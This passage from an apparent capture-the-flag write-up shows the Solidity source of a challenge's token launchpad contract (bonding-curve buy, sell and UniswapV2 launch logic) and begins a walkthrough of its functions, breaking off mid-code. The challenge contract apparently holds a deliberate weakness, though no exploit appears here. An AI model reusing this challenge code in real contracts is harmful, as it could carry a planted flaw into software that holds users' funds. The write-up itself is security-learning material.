</span></span><span class="line"><span class="cl">        <span class="n">targetGREYRaised</span> <span class="o">=</span> <span class="n">_targetGREYRaised</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ======================================== USER FUNCTIONS ========================================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">createToken</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">salt</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">external</span>
</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">tokenAddress</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Token</span> <span class="n">token</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Token</span><span class="p">{</span><span class="n">salt</span><span class="o">:</span> <span class="n">salt</span><span class="p">}(</span><span class="nb">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">tokenAddress</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pairs</span><span class="p">[</span><span class="n">tokenAddress</span><span class="p">]</span> <span class="o">=</span> <span class="n">Pair</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">virtualLiquidity</span><span class="o">:</span> <span class="n">virtualLiquidity</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveGREY</span><span class="o">:</span> <span class="n">virtualLiquidity</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">reserveToken</span><span class="o">:</span> <span class="n">token</span><span class="p">.</span><span class="n">INITIAL_AMOUNT</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// minAmountOut not needed here as token was just created
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_buyTokens</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">TokenCreated</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">buyTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">actualLiquidity</span> <span class="o">&gt;=</span> <span class="n">targetGREYRaised</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">TargetGREYRaisedReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_buyTokens</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="n">minAmountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">sellTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">storage</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">actualLiquidity</span> <span class="o">&gt;=</span> <span class="n">targetGREYRaised</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">TargetGREYRaisedReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_getAmountOut</span><span class="p">(</span><span class="n">amountIn</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// In theory, this check should never fail
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">amountOut</span> <span class="o">&gt;</span> <span class="n">actualLiquidity</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientGREYLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span> <span class="o">+=</span> <span class="n">amountIn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-=</span> <span class="n">amountOut</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amountOut</span> <span class="o">&lt;</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientAmountOut</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">TokenSold</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">launchToken</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">uniswapV2Pair</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">actualLiquidity</span> <span class="o">&lt;</span> <span class="n">targetGREYRaised</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">TargetGREYRaisedNotReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">delete</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">greyAmount</span> <span class="o">=</span> <span class="n">actualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">tokenAmount</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Burn tokens equal to ratio of reserveGREY removed to maintain constant price
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">burnAmount</span> <span class="o">=</span> <span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span> <span class="o">*</span> <span class="n">tokenAmount</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">tokenAmount</span> <span class="o">-=</span> <span class="n">burnAmount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">burn</span><span class="p">(</span><span class="n">burnAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">uniswapV2Pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">getPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">uniswapV2Pair</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">uniswapV2Pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">createPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="n">greyAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xdEaD</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">TokenLaunched</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">uniswapV2Pair</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ======================================== VIEW FUNCTIONS ========================================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">previewBuyTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_getAmountOut</span><span class="p">(</span><span class="n">amountIn</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">previewSellTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_getAmountOut</span><span class="p">(</span><span class="n">amountIn</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amountOut</span> <span class="o">&gt;</span> <span class="n">actualLiquidity</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientGREYLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">tokenPrice</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">price</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">price</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">.</span><span class="n">divWadDown</span><span class="p">(</span><span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">bondingCurveProgress</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">progress</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">memory</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">actualLiquidity</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">-</span> <span class="n">pair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">progress</span> <span class="o">=</span> <span class="n">actualLiquidity</span><span class="p">.</span><span class="n">divWadDown</span><span class="p">(</span><span class="n">targetGREYRaised</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ======================================== HELPER FUNCTIONS ========================================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_buyTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Pair</span> <span class="k">storage</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">pairs</span><span class="p">[</span><span class="n">token</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_getAmountOut</span><span class="p">(</span><span class="n">amountIn</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">,</span> <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pair</span><span class="p">.</span><span class="n">reserveGREY</span> <span class="o">+=</span> <span class="n">amountIn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair</span><span class="p">.</span><span class="n">reserveToken</span> <span class="o">-=</span> <span class="n">amountOut</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amountOut</span> <span class="o">&lt;</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientAmountOut</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">grey</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Token</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">TokenBought</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="n">amountOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_getAmountOut</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveOut</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientAmountIn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">reserveIn</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">reserveOut</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">InsufficientLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">*</span> <span class="n">reserveOut</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">reserveIn</span> <span class="o">+</span> <span class="n">amountIn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The code is quite long, but it&rsquo;s fine. Let&rsquo;s try to break it down one by one.</p>
<p>First, let&rsquo;s start from the <code>constructor</code>. When the contract get deployed, it will initialize the value of <code>virtualLiquidity</code> and <code>targetGREYRaised</code> passed by the deployer. It is basically just like what the title of the challenge said, is a launchpad for people to launch token to the UniswapV2 to be able traded when the funding target is fulfilled (<code>targetGREYRaised</code>).</p>
<p>To understand better, let&rsquo;s start by checking the <code>createToken</code> function.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">createToken</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">salt</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">external</span>
</span></span><span class="line"><span class="cl">    <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">tokenAddress</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="n">token</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Token</span><span class="p">{</span><span class="n">salt</span><span class="o">:</span> <span class="n">salt</span><span class="p">}(</span><span class="nb">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">tokenAddress</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pairs</span><span class="p">[</span><span class="n">tokenAddress</span><span class="p">]</span> <span class="o">=</span> <span class="n">Pair</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="n">virtualLiquidity</span><span class="o">:</span> <span class="n">virtualLiquidity</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">reserveGREY</span><span class="o">:</span> <span class="n">virtualLiquidity</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">reserveToken</span><span class="o">:</span> <span class="n">token</span><span class="p">.</span><span class="n">INITIAL_AMOUNT</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// minAmountOut not needed here as token was just created
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">amountIn</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">amountOut</span> <span class="o">=</span> <span class="n">_buyTokens</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">,</span> <span class="n">amountIn</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">TokenCreated</span><span class="p">(</span><span class="n">tokenAddress</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It will basically just create a new <code>Token</code> with the given param, and then initialize a &ldquo;virtual&rdquo; pair, where the initial reserve is <code>virtualLiquidity</code> of <code>GREY</code> and <code>INITIAL_AMOUNT</code> of <code>Token</code> that you want to launch.</p>
<p>Now, let&rsquo;s check the code of <code>buyToken</code> function.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">buyTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minAmountOut</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">)</span> <span class="p">{</span>
